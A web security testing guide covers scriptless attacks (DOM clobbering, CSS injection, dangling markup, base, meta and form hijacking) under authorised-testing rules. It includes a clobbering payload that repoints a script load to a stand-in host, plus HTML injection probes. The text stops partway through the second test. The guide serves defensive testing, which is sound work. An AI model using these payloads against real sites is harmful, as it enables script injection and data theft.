---
title: "DOM Clobbering, CSS Injection and Scriptless Attacks"
date: 2026-11-15 22:12:00 +0000
subcategory: client-side
summary: "What HTML injection still does when script is blocked: DOM clobbering, CSS injection, dangling markup, base, meta and form hijacking, and the fixes."
refs: [WSTG-CLNT-16, WSTG-CLNT-05, WSTG-CLNT-03, v5.0.0-3.2.3, v5.0.0-1.3.5, v5.0.0-1.3.1, v5.0.0-1.2.1, v5.0.0-3.4.3, "A05:2025", CWE-79, CWE-601, CWE-1287, CWE-451]
tags: [web, dom-clobbering, css-injection, dangling-markup, html-sanitisers, csp]
---

This note is part of our [Web Application Security testing guide](/web/web-application-security-testing-guide/) and sits under [Client-Side](/web/web-client-side-testing-guide/). It covers what an attacker can still do when they can inject HTML into a page but cannot run script, because a sanitiser removed the script or a Content Security Policy (CSP) refuses to execute it. Three WSTG tests meet here: DOM clobbering (`WSTG-CLNT-16`), CSS injection (`WSTG-CLNT-05`) and the scriptless side of HTML injection (`WSTG-CLNT-03`). ASVS 5.0 names the clobbering defence directly in `v5.0.0-3.2.3` and asks for user-supplied CSS and similar content to be sanitised or disabled in `v5.0.0-1.3.5`. The class has a name in the research literature: Heiderich, Niemietz, Schuster, Holz and Schwenk called it "scriptless attacks" in 2012, and the techniques have only grown since. A "safe" sanitiser output can still overwrite the globals your JavaScript reads, load a script through a library gadget, restyle the page into a fake dialog, leak attribute values through CSS selectors, swallow the rest of the page into an unclosed attribute, re-point every relative URL with a `base` tag, or send a form somewhere else. You get the model (named access, what CSS can request, how the parser can be turned against the page), the variants that produce findings, ten tests whose proofs never carry page data, and fixes for JavaScript, DOMPurify, server-side sanitisers in Node.js, Django, Spring and Laravel, and CSP. Classic script-executing XSS is in [Reflected and stored XSS](/web/web-reflected-stored-xss/) and [DOM XSS](/web/web-dom-xss-client-side-injection/); CSP design as a whole is in [Content Security Policy and browser security headers](/web/web-content-security-policy-headers/).

## Contents

- [How it works](#how-it-works)
  - [What is left when script is blocked](#what-is-left-when-script-is-blocked)
  - [Named access: how markup becomes a JavaScript value](#named-access-how-markup-becomes-a-javascript-value)
  - [How injected CSS reaches the screen and the network](#how-injected-css-reaches-the-screen-and-the-network)
  - [Markup that changes how the page is parsed or submitted](#markup-that-changes-how-the-page-is-parsed-or-submitted)
  - [What sanitisers and CSP do and do not stop](#what-sanitisers-and-csp-do-and-do-not-stop)
- [What goes wrong](#what-goes-wrong)
  - [Clobberable lookups in application code](#clobberable-lookups-in-application-code)
  - [Gadgets in libraries and bundlers](#gadgets-in-libraries-and-bundlers)
  - [Clobbering that defeats filters and sanitisers](#clobbering-that-defeats-filters-and-sanitisers)
  - [Style in user content](#style-in-user-content)
  - [Theme values and other CSS contexts](#theme-values-and-other-css-contexts)
  - [CSS in emails and embedded documents](#css-in-emails-and-embedded-documents)
  - [What injected CSS can do](#what-injected-css-can-do)
  - [Dangling markup](#dangling-markup)
  - [Base tag injection](#base-tag-injection)
  - [Meta refresh injection](#meta-refresh-injection)
  - [Form and button hijacking](#form-and-button-hijacking)
- [Testing](#testing)
  - [Before you start](#before-you-start)
  - [GT-WEB-CLOB-1: Map HTML injection points and what survives sanitising](#gt-web-clob-1-map-html-injection-points-and-what-survives-sanitising)
  - [GT-WEB-CLOB-2: Review the sanitiser configuration and version](#gt-web-clob-2-review-the-sanitiser-configuration-and-version)
  - [GT-WEB-CLOB-3: Find clobberable references in the JavaScript](#gt-web-clob-3-find-clobberable-references-in-the-javascript)
  - [GT-WEB-CLOB-4: Confirm a clobbered reference reaches a sink](#gt-web-clob-4-confirm-a-clobbered-reference-reaches-a-sink)
  - [GT-WEB-CLOB-5: Find CSS injection in style attributes, style elements and theme values](#gt-web-clob-5-find-css-injection-in-style-attributes-style-elements-and-theme-values)
  - [GT-WEB-CLOB-6: Prove that injected CSS can make an outbound request](#gt-web-clob-6-prove-that-injected-css-can-make-an-outbound-request)
  - [GT-WEB-CLOB-7: Dangling markup injection](#gt-web-clob-7-dangling-markup-injection)
  - [GT-WEB-CLOB-8: Base tag and meta refresh injection](#gt-web-clob-8-base-tag-and-meta-refresh-injection)
  - [GT-WEB-CLOB-9: Form, button and formaction hijacking](#gt-web-clob-9-form-button-and-formaction-hijacking)
  - [GT-WEB-CLOB-10: Review CSP for scriptless attacks](#gt-web-clob-10-review-csp-for-scriptless-attacks)
- [Secure implementation](#secure-implementation)
  - [Design rules](#design-rules)
  - [Clobber-resistant JavaScript](#clobber-resistant-javascript)
  - [DOMPurify configuration](#dompurify-configuration)
  - [Server-side sanitisers: Node.js, Django, Spring and Laravel](#server-side-sanitisers-nodejs-django-spring-and-laravel)
  - [CSS values and theming](#css-values-and-theming)
  - [CSP directives for scriptless attacks](#csp-directives-for-scriptless-attacks)
  - [Regression tests](#regression-tests)
- [Practice labs](#practice-labs)
- [Real-world cases](#real-world-cases)
- [Rating findings](#rating-findings)
- [Mapping](#mapping)
- [References](#references)

## How it works

### What is left when script is blocked

Most applications that render user HTML (comments, rich-text fields, Markdown, profile bios, support tickets, HTML email bodies, CMS blocks) defend themselves in one of two ways: a sanitiser that removes script-capable tags and attributes, or a CSP that refuses to run script the server did not vouch for. Both defences are aimed at the same thing, JavaScript execution. Neither is aimed at the markup that is left.

What is left is still a lot. A sanitiser that keeps "harmless" formatting usually keeps `a`, `img`, `form`, `input`, `button`, `style` and the `id`, `name`, `class`, `style`, `href` and `action` attributes. A CSP that blocks inline script often allows inline styles, images from anywhere, and form submissions to anywhere, because `form-action` and `base-uri` do not fall back to `default-src`. The attacks in this note live in that gap:

| Primitive | What it needs | What it gives the attacker |
|---|---|---|
| **DOM clobbering** | `id` or `name` attributes survive, and page JavaScript reads a global or a `document`/form property it never defined | A JavaScript value the attacker chose; through a gadget, a script URL, a redirect target or a bypassed client-side check |
| **CSS injection** | A `style` attribute, a `style` element, or a user value inside a stylesheet | Overlays and fake UI on a trusted origin; requests to attacker hosts that depend on what selectors match (attribute values, which characters are present) |
| **Dangling markup** | An injection that is not sanitised as a complete fragment (a reflected value in an attribute, a template that concatenates) | The markup after the injection point, captured into a URL or a window name and sent off-site |
| **Base tag** | A `base` element accepted before the page's relative URLs | Every relative script, stylesheet, link and form resolves against a host the attacker chose |
| **Meta refresh** | A `meta` element accepted in the document | A navigation to an attacker URL without script or a click |
| **Form hijacking** | `form`, `input`, `button` and `action`/`formaction`/`form` attributes survive | Submissions (including password-manager autofill) sent to an attacker host |

None of these is a curiosity. The [Real-world cases](#real-world-cases) include a Gmail bounty, three bundler CVEs, a Mastodon security release and a Swagger UI CVE, and DOM clobbering in particular turns into full XSS more often than its "scriptless" label suggests.

### Named access: how markup becomes a JavaScript value

Browsers keep a legacy feature the HTML standard calls **named access**: elements become properties of JavaScript objects without any script creating them.

- Every element with an `id` becomes a named property of `window`, and therefore a global. The `name` attribute does the same for a handful of elements (`embed`, `form`, `img`, `object`).
- The `name` attribute of `embed`, `form`, `iframe`, `img` and `object` creates a named property on `document`. These **override** the built-in properties of `document`, so an injected `img` named `cookie`, `currentScript` or `getElementById` replaces the real one for every script on the page.
- The controls of a `form` (`input`, `button`, `output`, `select` and so on) become properties of that form by `id` or `name`, and these also override the form's built-in properties, such as `action`, `method` or `attributes`.

`window` is different from `document` here: a named element never replaces a built-in `window` property (`location`, `top`) or anything the page defined. A global created with `var` or a function declaration wins over an element with the same `id`; `let` and `const` bindings win when code refers to them by bare name, but they are not properties of `window`, so `window.x` still returns the element. What clobbering targets is the **undefined** reference: a name the code reads but nothing ever assigned.

The shape of the value matters, because the attacker wants a specific type:

- A single element is an object, so it is **truthy** and `typeof` reports `"object"`. Checks like `if (window.isAdmin)` or `typeof debug !== "undefined"` pass.
- Most elements convert to strings like `[object HTMLImageElement]`, but `a` and `area` elements convert to their `href`. When the code uses the value as a string (a URL, a path), an anchor gives the attacker full control of that string.
- Two elements with the same `id` make the global an **HTMLCollection**. A member's `name` then becomes a property of the collection, which gives a second level: `x.y`. Forms with named inputs, and frames whose content defines further names, go deeper.

One short, benign example shows the pattern. The application has this code on a page that also renders sanitised comments:

```javascript
// Application code: an optional config object nobody defines on this page
const config = window.config || {};
const s = document.createElement("script");
s.src = config.cdnBase ? config.cdnBase + "/widget.js" : "/static/widget.js";
document.head.appendChild(s);
```

A comment containing two anchors survives any sanitiser that keeps `id`, `name` and `href`:

```html
<a id="config"></a><a id="config" name="cdnBase" href="https://example.org/gt-clob"></a>
```

`window.config` is now an HTMLCollection, `config.cdnBase` is the second anchor, and string concatenation turns it into `https://example.org/gt-clob`. The page loads `https://example.org/gt-clob/widget.js`. On a real attack that host serves script, and because the application itself created the `script` element, a CSP using `'strict-dynamic'` trusts it. That is how markup with no script in it becomes XSS. Gareth Heyes's *Bypassing CSP via DOM Clobbering* covers the `'strict-dynamic'` angle, and Michał Bentkowski used the same clobber-the-script-URL pattern against Gmail's AMP4Email (see [Real-world cases](#real-world-cases)).

### How injected CSS reaches the screen and the network

CSS has two powers that matter here. It decides **what the user sees**: position, size, opacity, stacking order, generated content. And several properties make the browser **fetch a URL**: `background-image`, `list-style-image`, `border-image`, `cursor`, `@import`, `@font-face` sources, `image-set()`, and more. A fetch can be conditional, because a rule only applies when its selector matches.

Put together, injected CSS can:

- Cover the real page with an attacker-styled block on the trusted origin (a fake "session expired" panel, a moved "Delete" button, hidden warning text). This is UI redress inside the page rather than through a frame, so `frame-ancestors` does not help.
- Make the browser request an attacker URL only when a selector matches something in the page, which turns selectors into an oracle. The classic is an attribute selector on an input's `value` attribute that fetches a background image only when the value starts with a given character; repeated per character, it reads a CSRF token or other attribute value. Newer work by Gareth Heyes (*Blind CSS Exfiltration*) uses `:has()` and chained `@import` rules to read values without knowing the page structure.
- Reveal text content indirectly: a font whose `unicode-range` covers one character is only downloaded if that character appears in the styled element, and custom fonts with ligatures change element widths in ways other CSS rules can detect (for example through whether a scrollbar appears).

This note describes those techniques but does not reproduce them. In testing, the proof is one request to a host you control with a fixed marker in the URL, which shows the channel exists (GT-WEB-CLOB-6); the rest is explained in the report.

Two limits are worth knowing because they decide severity. Attribute selectors match **attributes**, so they read what the server rendered into the HTML (hidden inputs, `value` attributes, `data-*` attributes, link targets), not what a user types later into a field (unless a framework writes the typed value back into the attribute). And conditional requests need somewhere to go: a CSP whose `img-src`, `font-src` and `style-src` exclude attacker hosts closes the network channel, even if the injection itself stays.

### Markup that changes how the page is parsed or submitted

Four more primitives need no script and no CSS.

**Dangling markup.** When an injection lands in a place where the attacker can open but not close a construct, the HTML parser keeps consuming the page into that construct until it finds the matching quote. An injected image whose `src` attribute is opened but never closed turns everything up to the next quote of the same kind (form fields, CSRF tokens, email addresses) into part of a URL, and the browser requests it. Variants capture into an `a` or `form` target, into a `base` element's `target` (which sets `window.name` for the next navigation), or into a `textarea`. This only works where the injection is not sanitised as a complete fragment: reflected values, server templates that concatenate, email templates, and DOM code that builds HTML strings. A proper HTML sanitiser parses and re-serialises, which closes the attribute.

**Base tag.** A `base` element sets the document base URL. If an attacker's `base` appears before the page's relative URLs are resolved, `/static/app.js`, `/login` and every relative `action` resolve against their host. Script loaded that way is the page's own `script` tag, so a CSP that allow-lists by nonce still trusts it if the tag carries the nonce.

**Meta refresh.** A `meta` element with `http-equiv="refresh"` navigates the page after a delay, to any URL, without a click.

**Form and button hijacking.** HTML lets controls attach to a form they are not inside (the `form` attribute takes a form `id`) and lets a button override the form's target (`formaction`, `formmethod`, `formtarget`). An injected `button` with `formaction` pointing elsewhere, styled to look like the real one, sends the real form's fields away. An injected `form` with `input` fields named `username` and `password` can be filled by the browser's password manager; Gareth Heyes showed this against an infosec Mastodon instance in 2022.

### What sanitisers and CSP do and do not stop

| Defence | Clobbering | CSS injection | Dangling markup | Base / meta | Form hijacking |
|---|---|---|---|---|---|
| HTML sanitiser, default config | Partly: DOMPurify's `SANITIZE_DOM` (on by default) removes `id`/`name` values that clash with built-in `document` and form properties, but keeps names like `config` | Usually not: DOMPurify allows `style` elements and attributes by default | Yes for the sanitised fragment (it is re-serialised, attributes closed) | DOMPurify removes `base` and `meta` by default | Usually not: `form`, `input`, `button` and `action` are in DOMPurify's default allow-list |
| Sanitiser with `SANITIZE_NAMED_PROPS` or `id`/`name` forbidden | Yes | No change | No change | No change | No change |
| Sanitiser with `style` forbidden or CSS allow-listed | No change | Yes | No change | No change | No change |
| CSP `script-src` with nonces, no `'strict-dynamic'` | Stops the "load a script" end of most gadgets; not redirects or logic bypasses | No | No | Not for relative scripts carrying a nonce | No |
| CSP `img-src`, `font-src`, `style-src` restricted | Partly (some gadgets fetch images) | Closes the network channel; overlays remain unless inline styles are also blocked | Closes image-based capture; not links, forms or `window.name` | No | No |
| CSP `base-uri 'none'` or `'self'` | No | No | No | Stops base injection | No |
| CSP `form-action 'self'` | No | No | Stops form-based capture | No | Stops off-site submission |
| Chromium dangling-markup mitigations | No | No | Partly (see below) | No | No |

Chromium has two specific mitigations for dangling markup: since Chrome 61 it blocks resource loads whose URL contains both a newline and a `<` character (which a captured chunk of HTML usually does), and since Chrome 119 it replaces a navigation target name containing that kind of markup with `_blank`. They are browser-specific defence in depth. Do not treat them as a fix, and test in every browser the client supports.

## What goes wrong

### Clobberable lookups in application code

The root cause is code that reads a name it did not define and trusts whatever comes back. The patterns that keep producing findings:

- **A default taken from a global**, such as `const cfg = window.appConfig || {};`. If the server forgot to inline `appConfig` on this page (error pages, previews and embedded views are the usual gaps), an element fills it. Sinks: script URLs, API base URLs, feature flags.
- **An existence check**, such as `if (window.isAdmin)` or `if (typeof DEBUG !== "undefined")`. An element is truthy and has type `"object"`. Sinks: hidden admin UI, debug panels, verbose logging, skipped confirmation steps.
- **A `document` property read by name**, such as `document.someSetting` or `document.currentScript.src`. A `name` on `img`, `form`, `embed`, `iframe` or `object` overrides even built-in `document` properties. Sinks: base paths for lazy-loaded chunks, configuration.
- **A built-in property of a form that may contain user markup**, such as `form.action`, `form.method`, `form.attributes` or `el.nodeName`. Named controls override them. Sinks: client-side filters, submission handlers.
- **A navigation target from a global**, such as `location = window.next || "/"`. An anchor converts to its `href`. Sinks: open redirect, or `javascript:` URLs where the sink allows them.
- **Markup from a global**, such as `el.innerHTML = window.template || ""`. An anchor's `href` gives the attacker a string. Sink: script-capable HTML.

Where to look: inline bootstrap scripts that expect the server to define a global, code shared between pages that do and do not define it, optional third-party configuration (`window.analyticsConfig`, `window.chatWidgetSettings`), and polyfills or feature detection that read `window.SomeApi` and fall back to a local implementation.

Modules and bundlers reduce the risk because module code does not create globals, but they do not remove it: module code still reads `window.x` and `document.x` when it wants page-provided configuration, and bundler runtimes read `document.currentScript`.

### Gadgets in libraries and bundlers

A **gadget** is existing, legitimate code that turns a clobbered value into something dangerous. The application author often did not write it. In 2024 GitHub security advisories reported DOM clobbering gadgets in the generated runtime code of three bundlers: webpack's automatic public path (`AutoPublicPathRuntimeModule`, CVE-2024-43788) read `document.currentScript.src` to decide where to load further chunks from, so an injected `img` with `name="currentScript"` and a `src` on another host moved every lazy-loaded chunk there; Vite (CVE-2024-45812) and Rollup (CVE-2024-47068) had the same class of issue for `import.meta.url` in non-ES output formats. The webpack advisory reports real-world exploitation in Canvas LMS. DOMPurify with its default `SANITIZE_DOM` would drop this particular `name`, because `currentScript` already exists on `document`; the gadget matters wherever user HTML reaches the page through a different sanitiser, a Markdown renderer or a configuration with that protection off. Khodayari and Pellegrino's IEEE S&P 2023 study (*It's (DOM) Clobbering Time*) ran an automated detector over the Tranco top 5,000 sites and reported 9,467 vulnerable data flows on 491 of them; their companion site domclob.xyz collects techniques and patterns.

The testing consequence: you are not only reviewing the application's own code. Any library on a page that renders user HTML is part of the attack surface, and a dependency upgrade is often the fix (GT-WEB-CLOB-2).

### Clobbering that defeats filters and sanitisers

Clobbering also attacks the code that is supposed to stop injection. A filter that walks a `form` element and reads its `attributes`, `childNodes`, `nodeName` or `removeAttribute` can be fed a form containing an input named after that property; the filter then reads an input element instead of the real list and skips what it should remove. PortSwigger's lab *Clobbering DOM attributes to bypass HTML filters* is built on this. DOMPurify guards against it internally (it checks forms for clobbered properties before trusting them), which is one of the reasons to prefer it over a home-grown filter. Its README still warns that in `IN_PLACE` mode the root node you pass in must not itself be clobbered.

### Style in user content

The common sources of injectable CSS:

- **Sanitisers that allow style.** DOMPurify keeps `style` elements and `style` attributes by default; it does not parse or allow-list the CSS inside them. sanitize-html, by contrast, only keeps the styles you list in `allowedStyles`, matched by regular expression.
- **Rich-text editors** that store inline styles for colours and fonts and render them back without restriction.
- **Markdown renderers** with raw HTML enabled, which pass `style` through with the rest of the HTML.
- **"Custom CSS" features**: profile themes, white-label branding, community pages, landing-page builders. Some are features by design; the question is who else renders that CSS and what is on the page with it.

ASVS `v5.0.0-1.3.5` covers this directly: user-supplied scriptable or expression content, CSS included, is sanitised or disabled.

### Theme values and other CSS contexts

The injection does not need a `style` tag in the input. A single value that the server or client places **inside** CSS is enough when it is not validated:

- a brand colour stored as free text and rendered into an inline `style` block or a CSS custom property;
- a font name or background-image URL in a theme setting;
- a server template that writes a query parameter into a `style` attribute;
- client code that assigns user data to `element.style.cssText` or builds a stylesheet string.

A colour field that accepts `#336699;}` followed by new rules is a stylesheet injection point. HTML escaping does not help inside CSS: the value contains no `<` or `"`, and the CSS parser happily accepts the extra rules. The fix is validation against a strict format (a hex colour pattern, a list of allowed fonts) plus CSS-context encoding where free text must go into CSS (ASVS `v5.0.0-1.2.1` names CSS as one of the contexts that need their own encoding).

### CSS in emails and embedded documents

HTML email bodies are an injection surface that often gets less attention. A webmail client, a helpdesk tool that renders customer emails, or a CRM that previews messages renders third-party HTML by definition, and email HTML relies on inline styles, so `style` is almost always allowed. Dynamic-email formats add more: Gmail's AMP4Email was where Bentkowski found his clobbering XSS. The same applies to document previews (HTML export of uploaded documents, rendered SVG, OpenAPI viewers). The Swagger UI case in [Real-world cases](#real-world-cases) is an OpenAPI viewer loading a remote document with CSS in it. Where the renderer is on the same origin as the application, the injected CSS runs next to the session's pages.

### What injected CSS can do

In order of how often it matters in reports:

1. **UI redress and content spoofing.** Absolutely positioned, full-viewport elements with a high `z-index` place attacker content over the real page: a fake login prompt, a payment-detail form, a changed bank account number in an invoice view, or an invisible layer over a real button. The page is on the trusted origin with a valid certificate, so users have no visual cue. CWE-451 (UI misrepresentation) describes the outcome.
2. **Hiding security-relevant UI.** `display: none` on warnings, MFA prompts or "this link leaves the site" notices.
3. **Attribute-value exfiltration.** Selector-conditional requests read rendered attribute values character by character: CSRF tokens in hidden inputs, API keys shown in `value` attributes, email addresses in `data-*` attributes, personal data in pre-filled forms. The research versions chain `@import` rules so that each step learns the next character without a page reload.
4. **Text-content inference.** Font tricks (`unicode-range`, ligatures, width changes detected through scrollbars) leak which characters appear in an element, and sometimes their order, without any selector on attributes.
5. **Tracking and confirmation.** A single conditional request tells the attacker that a specific user viewed a page or that a page contains a given value (an XS-Search-style oracle). Even an unconditional request reveals the viewer's IP address and timing.
6. **Script execution in old browsers.** CSS expressions and similar features in legacy Internet Explorer could run script; WSTG notes this as legacy. Modern browsers do not run script from CSS, so do not rate CSS injection as XSS for that reason alone.

Exfiltration needs three things at once: data rendered into the DOM in a form a selector can test, an element the injected rule can reach relative to it, and a property that makes a request to a host the CSP allows. Missing any of them caps the finding at UI redress.

### Dangling markup

Dangling markup applies where the attacker's input is **not** handled as a complete fragment:

- a reflected parameter written into an attribute (`value="..."`, `href="..."`) where quotes are escaped inconsistently or one quote type is missing;
- server templates that build HTML by concatenation, including email templates;
- error pages and "you searched for" banners;
- client code that builds an HTML string and assigns it, especially when one part comes from the user and the rest is the page.

The captured content is whatever follows the injection point up to the next matching quote: often a CSRF token, a form of personal data, or a one-time link in an email. PortSwigger's write-ups show capture into image URLs (blocked by Chromium's newline-and-angle-bracket rule in most cases), into link and form targets, and into `window.name` through an injected `base` element's `target`, a variant built to survive a strict CSP. Gareth Heyes's *Evading CSP with DOM-based dangling markup* shows that last route and recommends placing your own `base target` element early in the page as a mitigation.

### Base tag injection

The `base` element changes the base URL of the whole document, which makes it powerful far beyond the injection point. If injected markup is placed before the application's own script, stylesheet and form tags (in the `head`, through a server template, or through an early user-controlled block such as a page title or banner), every relative URL after it resolves against the attacker's host. ASVS `v5.0.0-3.4.3` requires `base-uri 'none'` in the global CSP for that reason; without the directive, any `base` element is honoured. In client-rendered applications, resources that already loaded are unaffected when a `base` element arrives with user content, but everything resolved afterwards uses the new base: lazy-loaded chunks, `fetch` with relative paths, `new URL(path, document.baseURI)`, links and form actions.

### Meta refresh injection

A `meta` refresh element in user content redirects every viewer of that content after the given delay: a scriptless, clickless open redirect, which is enough for a convincing phishing hop from a trusted page (CWE-601). CSP has no directive that blocks meta refresh navigation at the time of writing (a navigation directive, `navigate-to`, was proposed and dropped). Most sanitisers remove `meta` (DOMPurify does by default); the finding appears where HTML is rendered without a sanitiser or with a hand-written allow-list. Browser handling of a `meta` refresh inserted by script rather than parsed with the page can differ, so test the actual rendering path.

### Form and button hijacking

Three variants, all scriptless:

- **Injected `formaction` on a button** (or a button outside the form that names it in the `form` attribute): the click submits the real form's fields to the attacker host.
- **Injected form near or inside a real one**: HTML does not allow nested forms, so the parser's handling of an injected `form` start tag inside another form can change which form the following fields belong to.
- **Injected login form for the password manager**: a form with `username` and `password` inputs on the trusted origin may be autofilled by the browser, and a styled submit button or an attacker-controlled interface element sends it. Heyes's Mastodon research used an existing CSS class to hide the inputs because the CSP blocked inline styles.

`form-action` is the CSP directive for all three, and it does not fall back to `default-src`: a policy with only `default-src 'self'` allows submissions anywhere. MDN notes that browsers differ on whether `form-action` also applies to redirects after submission.

## Testing

### Before you start

**Authorisation.** Every test here assumes an authorised engagement with written scope and rules of engagement, a bug bounty programme whose rules allow it, or a deliberately vulnerable lab. Outputs in this note are illustrative, not from a real system.

**Agree the following in writing:**

| Item | What to agree |
|---|---|
| Rendering surfaces | Which features render user HTML or CSS in scope: comments, rich text, Markdown, profile and theme settings, HTML email rendering, document and API-definition viewers, admin and support tools that show user content |
| Where stored markers may go | Only objects that only your own test accounts can see, or a staging environment. A comment on a public post, a support ticket that staff will open, or an email that reaches a real inbox is out unless the client approves that exact placement in writing |
| Collaborator | That you may trigger outbound requests to a host you control, and which one |
| Browsers | Which browsers and versions the client supports; scriptless results differ between engines (Chromium's dangling-markup mitigations, for example) |
| Grey-box material | Front-end source or source maps, sanitiser configuration, CSP configuration; clobbering is far quicker to find with source |

**Accounts.** Two accounts you control: user A (author of the content) and user B (the viewer). Some rendering paths only show content to other users, and the viewer's page is where the attack lands. Where a back-office tool renders user content, test it only with a staff test account the client gives you and only on objects you created.

**Browser profile.** A dedicated test profile with no real saved passwords, no synced accounts and autofill off, except in GT-WEB-CLOB-9, where you deliberately save one throwaway credential for your own test account. Burp's embedded browser with **DOM Invader** is convenient: its DOM clobbering mode is off by default because it can interfere with the page, so switch it on only for test 3 and 4 and reload.

**Proof payloads are markers.** Every payload in this note is a visible text marker (`GT-CLOB-<n>`), an inert element you inspect in DevTools, a static URL on your collaborator or a redirect to `https://example.org/`. Specifically:

- DOM clobbering proofs stop at the console showing the controlled value and, at most, an attempted request to `https://example.org/`. Script execution is only demonstrated in staging or a lab, with a file on your own host that contains a `console.log` marker and nothing else.
- CSS and dangling markup proofs are **one request to your own collaborator**, triggered by an injected style or tag, whose URL carries a fixed marker and **no page data**. Never test attribute selectors, `@import` chains, font or ligature tricks against a client system; describe them in the report.
- Dangling-markup capture is shown **locally only**: you inject an unclosed attribute that makes no request and look at the parsed DOM in your own browser.
- Form tests never submit real data. Use dummy values in your own test account.

**Collaborator.** Burp Collaborator or a self-hosted interactsh server, with one subdomain per test so you can tie an interaction to a payload. This note writes it as `<id>.oob.example.org`. Return an empty response or a `404`; never serve script, CSS or HTML back to the target.

**Marker register and clean-up.** Keep a list of every place you stored a marker (object URL, account, timestamp, payload). Remove each one at the end of testing and confirm removal as user B. A stored `base`, `meta` refresh or overlay breaks the page for anyone who sees it, so delete those immediately after the observation.

**Stop rules.** If injected markup renders somewhere you did not expect (an admin dashboard, a notification email, another tenant's view), stop, remove it, and tell the client. If a page shows real third-party data while you are inspecting it, keep only the minimum redacted evidence, do not record more, and report it immediately. Keep request rates low; none of these tests needs volume.

### GT-WEB-CLOB-1: Map HTML injection points and what survives sanitising

*Guler Tech methodology.* Implements the identification steps of WSTG-CLNT-03 (HTML Injection) and WSTG-CLNT-16 (identify injection points that keep `id` and `name`), and the injection-point part of WSTG-CLNT-05.

#### What it checks

Where user-controlled markup reaches a page, and which tags and attributes survive the sanitiser on each path. The result is a matrix that tells you which of the later tests apply where.

#### Prerequisites

Users A and B; a full walk-through in Burp with Logger on; a list of features that accept formatted text (from the UI, API documentation, or editor toolbars).

#### Steps

1. List every input that ends up rendered as HTML: rich-text and Markdown fields, comment and chat bodies, profile bios, display names shown in HTML contexts, file names, imported documents, email bodies the application renders, theme and branding settings. Note who sees each one (only the author, other users, staff).
2. For each, store this probe as user A in an object only you can see. It makes no network requests (`img` has no `src`, the form and button only point at `example.org` and are never clicked):

   ```html
   <p id="gtclob1a" class="gt-clob-1" title="GT-CLOB-1" data-gt="1" style="outline:3px solid magenta">GT-CLOB-1 paragraph</p>
   <a id="gtclob1b" name="gtclob1b" href="https://example.org/gt-clob-1" target="_blank">GT-CLOB-1 link</a>
   <img name="gtclob1c" alt="GT-CLOB-1 image">
   <form id="gtclob1d" action="https://example.org/gt-clob-1"><input name="gtclob1e" value="GT-CLOB-1"><button formaction="https://example.org/gt-clob-1">GT-CLOB-1 button</button></form>
   <style>.gt-clob-1 { color: magenta; }</style>
   ```

   The same through the API, if the feature has one:

   ```http
   PUT /api/notes/8812 HTTP/1.1
   Host: app.example.com
   Cookie: session=<SESSION_USER_A>
   Content-Type: application/json

   {"body_html":"<p id=\"gtclob1a\" style=\"outline:3px solid magenta\">GT-CLOB-1</p><a id=\"gtclob1b\" name=\"gtclob1b\" href=\"https://example.org/gt-clob-1\">GT-CLOB-1</a>"}
   ```

3. Open the rendered object as user B (or as user A if only the author sees it). In the Elements panel, record which elements and attributes are still there, and whether values were changed (a `user-content-` prefix on `id` and `name` means DOMPurify's `SANITIZE_NAMED_PROPS` or a similar renderer convention).
4. In the Console, check named access directly:

   ```javascript
   window.gtclob1a;      // element or undefined
   window.gtclob1b;      // anchor or undefined
   document.gtclob1c;    // img by name or undefined
   window.gtclob1d && window.gtclob1d.gtclob1e;  // form control by name
   getComputedStyle(document.querySelector("#gtclob1a, [id$='gtclob1a']")).outlineColor;
   ```

5. Repeat for each rendering path. The same stored content can be sanitised differently in the web page, the mobile API response rendered in a web view, the email notification and the admin view.

#### Observation

A matrix like this (illustrative):

| Surface | Who sees it | `id`/`name` | `style` attr | `style` element | `form`/`input`/`button` | `formaction` | `href` to other hosts |
|---|---|---|---|---|---|---|---|
| Post comments | All members | kept | kept | removed | kept | removed | kept |
| Profile bio | Anyone | prefixed `user-content-` | removed | removed | removed | removed | kept |
| Support ticket body (staff view) | Staff | kept | kept | kept | kept | kept | kept |
| Notification email | Recipient | n/a | kept | kept | n/a | n/a | kept |

#### Evaluation

No finding by itself; this is the work list. It becomes evidence for later tests: `id`/`name` kept means clobbering is possible if a gadget exists (tests 3 and 4); `style` kept means CSS injection (tests 5 and 6); `form`, `input`, `button` or `formaction` kept means form hijacking (test 9). Markup that renders with **no** sanitising at all is an HTML injection finding on its own (content spoofing, CWE-79) and should also be tested for script execution as described in [Reflected and stored XSS](/web/web-reflected-stored-xss/).

#### False positives

The editor preview often renders unsanitised content in the author's own browser only (self-only, usually not a finding by itself). Elements that appear in the DOM but inside a sandboxed `iframe` or a separate origin used for user content are isolated from the application's globals; check `location.origin` in the frame's console context.

#### Automation

Burp Scanner reports some HTML injection. For CI, a unit test per rendering path that runs the real sanitiser on this probe and asserts the expected output (see [Regression tests](#regression-tests)) catches configuration drift, which is the usual cause of regressions.

### GT-WEB-CLOB-2: Review the sanitiser configuration and version

*Guler Tech methodology.* Implements the grey-box sanitiser checks of WSTG-CLNT-16 and supports WSTG-CLNT-03 and WSTG-CLNT-05; checks ASVS `v5.0.0-1.3.1` and `v5.0.0-1.3.5`.

#### What it checks

Which sanitiser runs on each path, in which version, with which options, and whether anything after it undoes its work.

#### Prerequisites

The front-end bundles (from your own session) or source; server-side source or configuration if the client provides it.

#### Steps

1. Identify the sanitiser. In bundles, search for `DOMPurify`, `SANITIZE_DOM`, `SANITIZE_NAMED_PROPS`, `user-content-`, `sanitize-html`, `allowedTags`, `xss(`, or a Markdown renderer's `html: true` option. Server-side, look for nh3, bleach, the OWASP Java HTML Sanitizer, Symfony HtmlSanitizer, HTML Purifier, or a hand-written regex filter.
2. Record the version. DOMPurify exposes `DOMPurify.version` when the object is reachable from the console; otherwise the version string is usually in the bundle or `package-lock.json`. Compare it with the project's GitHub security advisories. Known bypasses are reported as a version finding; do not try them against the client.
3. Read the configuration and note, for DOMPurify:
   - `SANITIZE_DOM` set to `false` (removes the built-in clobbering protection);
   - `SANITIZE_NAMED_PROPS` absent or `false` while `id`/`name` are allowed;
   - `ADD_ATTR` or `ALLOWED_ATTR` adding `id`, `name`, `style`, `formaction`, `target`;
   - `ADD_TAGS` adding `style`, `form`, `base`, `meta`, `link`, `iframe`;
   - hooks (`addHook("uponSanitizeAttribute", ...)`) that set `forceKeepAttr` or rewrite values;
   - `USE_PROFILES`, which overrides `ALLOWED_TAGS` and `ALLOWED_ATTR` according to the README, so a combined config may not do what its author intended.
